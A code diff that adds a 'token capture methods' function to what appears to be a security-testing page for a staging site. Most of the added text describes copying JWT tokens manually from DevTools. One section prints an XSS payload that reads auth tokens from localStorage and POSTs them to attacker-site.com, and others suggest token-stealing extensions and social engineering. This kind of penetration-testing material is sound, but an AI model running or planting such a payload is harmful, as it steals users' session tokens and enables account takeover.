@@ -135,6 +135,7 @@
             <input type="text" id="jwtToken" placeholder="Paste JWT token here (Bearer token only, without 'Bearer ' prefix)">
             <br>
             <button onclick="testTokenBasedCSRF()" class="danger">Test CSRF with Token</button>
+            <button onclick="showTokenCaptureMethods()" class="success">Show Token Capture Methods</button>
         </div>
 
         <div class="test-section">
@@ -411,6 +412,55 @@
             }
             
             log('=== WEBHOOK SPOOFING TEST COMPLETED ===\n');
+        }
+
+        function showTokenCaptureMethods() {
+            log('=== TOKEN CAPTURE METHODS ===');
+            log('⚠️  Note: Due to Same-Origin Policy, this page cannot directly access');
+            log('   localStorage/sessionStorage from ml-stage.farmartos.com');
+            log('');
+            log('🔍 Methods to capture tokens for testing:');
+            log('');
+            log('1. MANUAL METHOD (Recommended for testing):');
+            log('   a) Login to https://ml-stage.farmartos.com');
+            log('   b) Open DevTools (F12) → Application tab → Local Storage');
+            log('   c) Look for keys like: token, auth, jwt, access_token');
+            log('   d) Copy the value and paste it in the token input above');
+            log('');
+            log('2. NETWORK INTERCEPTION:');
+            log('   a) Login to FarmartOS');
+            log('   b) DevTools → Network tab');
+            log('   c) Make any API request');
+            log('   d) Look for Authorization header in request');
+            log('   e) Copy the Bearer token value');
+            log('');
+            log('3. XSS INJECTION (if you find XSS vulnerability):');
+            log('   Inject this payload on ml-stage.farmartos.com:');
+            log('   ```javascript');
+            log('   // Capture token from localStorage');
+            log('   let token = null;');
+            log('   for (let key in localStorage) {');
+            log('       if (key.includes("token") || key.includes("auth")) {');
+            log('           token = localStorage.getItem(key);');
+            log('           break;');
+            log('       }');
+            log('   }');
+            log('   // Send to attacker server');
+            log('   fetch("https://attacker-site.com/steal", {');
+            log('       method: "POST",');
+            log('       body: JSON.stringify({token: token})');
+            log('   });');
+            log('   ```');
+            log('');
+            log('4. BROWSER EXTENSION (for testing):');
+            log('   Create extension that runs on ml-stage.farmartos.com');
+            log('   and captures tokens from localStorage');
+            log('');
+            log('5. SOCIAL ENGINEERING:');
+            log('   Trick user into visiting malicious page while logged in');
+            log('   and use XSS or other methods to steal tokens');
+            log('');
+            log('=== END TOKEN CAPTURE METHODS ===\n');
         }
 
         // Auto-run basic test on page load
